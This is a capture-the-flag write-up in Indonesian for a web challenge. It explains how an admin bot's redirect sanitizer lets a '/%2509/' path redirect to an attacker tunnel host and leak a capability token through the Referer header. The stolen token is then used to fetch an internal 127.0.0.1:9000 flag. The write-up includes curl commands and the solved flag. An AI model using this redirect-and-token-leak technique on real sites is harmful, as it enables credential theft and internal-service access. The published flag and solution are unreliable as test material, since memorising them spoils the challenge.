# Login_page

## Ringkas

Bug utamanya ada di bot worker:

- bot ambil capability dari `/admin/hint-token`
- bot menempelkan capability itu ke URL yang kita submit di `/submit`
- bot follow redirect manual dan pakai `Referer` dari URL awal
- sanitizer redirect cuma buang `%09`, `%0a`, `%0d`, jadi bisa dipakai buat ubah `Location: /%09/...` jadi `//...`

Kalau kita bikin `/login?ReturnUrl=/%2509/<tunnel-host>`, response awal dari `/login` akan `302` ke `/%09/<tunnel-host>`. Setelah disanitasi di bot, itu jadi request ke host eksternal milik kita. `Referer`-nya masih berisi `cap=...`, jadi capability bocor.

Capability itu lalu dipakai ke endpoint loopback random path untuk fetch `/flag` dari service internal `127.0.0.1:9000`.

## Recon

Route penting dari binary:

- `GET /login`
  - kalau ada `ReturnUrl` atau `secret`, server sign-in dan return `302`
- `GET /whoami`
  - bantu verifikasi role
- `GET /admin/hint-token`
  - butuh role `admin`, return JSON `{ capability: "..." }`
- `POST /submit`
  - antri URL yang nanti dibuka bot
- `GET /{resourcePath}`
  - validasi capability, lalu fetch target loopback

## Root Cause

Di worker redirect handler:

- `Location` disanitasi dengan regex `(?i)%0[9ad]|[\t\r\n]`
- kalau hasilnya mulai dengan `//`, bot ubah jadi URL absolut memakai scheme current URL
- saat pindah cross-origin, bot tetap kirim `Referer` dari request sebelumnya

Itu bikin capability yang ada di query string ikut kebawa ke server eksternal.

## Exploit

1. Start listener publik lewat Cloudflare Tunnel.
2. Submit path yang memicu redirect:

```bash
curl -X POST 'http://<instance>/submit?url=/login?ReturnUrl=/%2509/<tunnel-host>'
```

3. Tunggu bot hit tunnel dan ambil `cap` dari `Referer`.
4. Decode `cap` untuk dapat `resourcePath`.
5. Pakai capability ke endpoint resource path untuk fetch flag dari `http://127.0.0.1:9000/flag`.

## Command yang dipakai

```bash
curl -i -X POST 'http://<instance>/submit?url=/login?ReturnUrl=/%2509/<tunnel-host>'
curl -i 'http://<instance>/<resourcePath>?target=http://127.0.0.1:9000/flag&cap=<capability>'
```

## Flag

`NHNC{I_F0und_th1s_r3dir3ct_1ssu3_by_r3ading_th3_s0rc3_1n_d0t_N3T_8a2e57a7cd944a188133e98057b77120}`
